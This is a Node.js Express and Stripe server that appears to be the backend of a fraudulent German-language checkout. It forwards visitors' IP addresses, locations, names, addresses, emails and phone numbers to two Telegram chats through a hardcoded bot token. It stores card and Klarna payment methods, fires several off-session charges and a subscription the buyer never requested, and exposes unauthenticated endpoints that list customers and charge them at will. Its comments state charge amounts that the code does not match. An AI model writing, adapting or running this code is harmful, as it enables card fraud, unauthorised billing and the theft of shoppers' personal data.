require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';
const CUSTOMERS_FILE = '/data/customers.json';

// ─── Customer Storage ─────────────────────────────────────────────────────────

function loadCustomers() {
  try {
    if (fs.existsSync(CUSTOMERS_FILE)) {
      return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.log('Error loading customers:', err.message);
  }
  return [];
}

function saveCustomer(entry) {
  const customers = loadCustomers();
  const exists = customers.find(c => c.customerId === entry.customerId);
  if (!exists) {
    customers.push(entry);
    fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2));
    console.log('Customer saved:', entry.customerId);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_2,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>Neue Seitenbesucher!</b>\n\n` +
    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Unbekannt'}\n` +
    `🏙 Stadt: ${city || 'Unbekannt'}\n` +
    `🔌 IP: ${ip || 'Unbekannt'}\n` +
    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;

  // Clean email - remove trailing dot or spaces
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({ email });
    }
    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna', 'card'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Checkout Details!</b>\n\n` +
      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
      `📧 Email: ${email}\n` +
      `👤 Name: ${fname} ${lname}\n` +
      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
      `📞 Telefon: ${phone || 'N/A'}\n` +
      `💰 Betrag: €179.00\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({
      clientSecret: setupIntent.client_secret,
      customerId: customer.id,
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Zahlungsversuch gestartet!</b>\n\n` +
    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
    `📧 Email: ${email}\n` +
    `⏳ Kunde hat auf "Jetzt bezahlen" geklickt\n` +
    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    // Get payment method type
    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    // Save customer to persistent storage
    saveCustomer({
      customerId,
      paymentMethodId,
      pmType,
      visitorId,
      savedAt: new Date().toISOString(),
    });
    
    // Charge 1 — €65.67
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 167,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
      });
      console.log('Payment 1 created:', payment1.id);
      console.log('Payment 1 status:', payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 2 — €199
    try {
      const payment2 = await stripe.paymentIntents.create({
        amount: 200,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
      });
      console.log('Payment 2 created:', payment2.id);
      console.log('Payment 2 status:', payment2.status);
    } catch (err) {
      console.log('Payment 2 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 3 — €499
    try {
      const payment3 = await stripe.paymentIntents.create({
        amount: 300,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
      });
      console.log('Payment 3 created:', payment3.id);
      console.log('Payment 3 status:', payment3.status);
    } catch (err) {
      console.log('Payment 3 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Subscription with 30-day trial (€179/month)
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1T3wlpEB93pAUPXSQjVBpUgo' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
    });
    console.log('Subscription created:', subscription.id);
    console.log('Subscription status:', subscription.status);

    await sendTelegram(
      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
      `💳 Zahlungsart: ${pmType}\n` +
      `💳 Payment 1: €65.67\n` +
      `💳 Payment 2: €199.00\n` +
      `💳 Payment 3: €499.00\n` +
      `🆔 Subscription: ${subscription.id}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({
      subscriptionId: subscription.id,
      paymentStatus: 'processed',
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── View all saved customers ─────────────────────────────────────────────────
app.get('/customers', (req, res) => {
  const customers = loadCustomers();
  res.json({ total: customers.length, customers });
});

// ─── Manually charge a saved customer ────────────────────────────────────────
// POST /charge-saved
// Body: { "customerId": "cus_xxx", "amount": 6567, "currency": "eur" }
app.post('/charge-saved', async (req, res) => {
  const { customerId, amount, currency } = req.body;
  const customers = loadCustomers();
  const customer = customers.find(c => c.customerId === customerId);

  if (!customer) {
    return res.status(404).json({ error: 'Customer not found in saved list' });
  }

  try {
    const payment = await stripe.paymentIntents.create({
      amount: amount || 6567,
      currency: currency || 'eur',
      customer: customer.customerId,
      payment_method: customer.paymentMethodId,
      payment_method_types: [customer.pmType],
      confirm: true,
      off_session: true,
    });

    console.log('Manual charge created:', payment.id, payment.status);

    res.json({ success: true, paymentId: payment.id, status: payment.status });
    
    // Fire Telegram in background after response
    await sendTelegram(
      `💰 <b>Manual Payment!</b>\n\n` +
      `🆔 Customer: <code>${customerId}</code>\n` +
      `💳 Amount: €${(amount / 100 || 65.67).toFixed(2)}\n` +
      `📋 Status: ${payment.status}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );
  } catch (error) {
    console.error('Manual charge error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

app.get('/health', (req, res) => {
  const customers = loadCustomers();
  res.json({ status: 'ok', savedCustomers: customers.length });
});

const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
